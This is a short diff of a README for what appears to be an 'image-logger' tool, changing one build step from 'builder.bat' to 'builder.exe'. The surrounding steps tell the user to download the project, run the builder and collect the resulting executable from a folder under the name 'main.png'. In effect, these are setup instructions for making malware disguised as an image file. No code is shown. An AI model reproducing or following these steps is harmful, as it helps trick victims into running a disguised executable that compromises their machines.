@@ -60,7 +60,7 @@
 
 1. [Download source code zip](https://github.com/neveronsere/image-logger/archive/refs/heads/main.zip)
 2. Extract zip
-3. Run `builder.bat`
+3. Run `builder.exe`
 4. Follow instructions in builder and your exe will be found in the `dist` folder under the name `main.png`
 
 <div align="center">
